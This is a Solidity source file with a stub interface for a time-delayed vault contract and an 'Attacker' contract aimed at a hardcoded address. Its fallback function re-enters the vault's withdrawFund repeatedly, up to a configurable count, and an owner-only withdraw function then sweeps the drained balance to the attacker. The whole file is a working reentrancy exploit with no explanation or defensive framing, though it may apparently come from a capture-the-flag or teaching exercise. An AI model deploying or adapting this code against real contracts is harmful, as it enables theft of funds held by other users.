pragma solidity ^0.4.17;

contract TimeDelayedVault {
    uint  public nextWithdrawTime;
    uint  public withdrawCoolDownTime;
    
    function TimeDelayedVault() {}
    
    function withdrawFund(address dst) external returns (bool) {}
}


contract Attacker {
    
    address public target = 0x552f7fc0b38932d3843dca037998e11819c2373e;
    address public owner;
    uint public count;
    uint public step = 40;
    
    function setTarget(address _target) {
        require(msg.sender == owner);
        target = _target;
    }
    
    function attack() {
        require(msg.sender == owner);
        TimeDelayedVault myContract = TimeDelayedVault(target);
        myContract.withdrawFund(this);
    }
    
    
    function Attacker() {
        owner = msg.sender;
    }
    
    function withdraw() {
        require(msg.sender == owner);
        count = 0;
        owner.transfer(this.balance);
    }
    
    function setStep(uint _step) {
        require(msg.sender == owner);
        step = _step;
    }
    
    function () payable{
        count = count + 1;
        if (count < step){
            TimeDelayedVault myContract = TimeDelayedVault(target);
            myContract.withdrawFund(this);
        }
    }

}